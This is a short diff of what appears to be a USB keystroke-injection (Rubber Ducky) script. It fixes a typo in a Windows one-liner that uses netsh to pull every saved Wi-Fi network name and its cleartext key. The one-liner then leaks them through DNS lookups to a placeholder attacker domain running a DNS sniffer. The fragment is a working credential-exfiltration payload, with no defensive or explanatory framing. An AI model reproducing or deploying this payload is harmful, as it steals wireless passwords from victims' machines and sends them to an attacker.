@@ -38,7 +38,7 @@ STRING @echo off
 DELAY 500
 ENTER
 DELAY 500
-STRING for /f "tokens=3* delims=: " %a IN ('netsh wlan show profiles ^|findstr /c:"    " ^|findstr ":"') do for /f "tokens=3 delims=: " %c in ('netsh wlan sh pr "%b" key^=clear 2^>nul^|findstr /c:": "^|findstr "Key Content"') do ing -n 1 -w 1000 -4 %b.%c.dns.yourdomain_where_you_have_a_dns_sniffer_and_NS_record_on.com > nul
+STRING for /f "tokens=3* delims=: " %a IN ('netsh wlan show profiles ^|findstr /c:"    " ^|findstr ":"') do for /f "tokens=3 delims=: " %c in ('netsh wlan sh pr "%b" key^=clear 2^>nul^|findstr /c:": "^|findstr "Key Content"') do ping -n 1 -w 1000 -4 %b.%c.dns.yourdomain_where_you_have_a_dns_sniffer_and_NS_record_on.com > nul
 DELAY 500
 ENTER
 DELAY 500
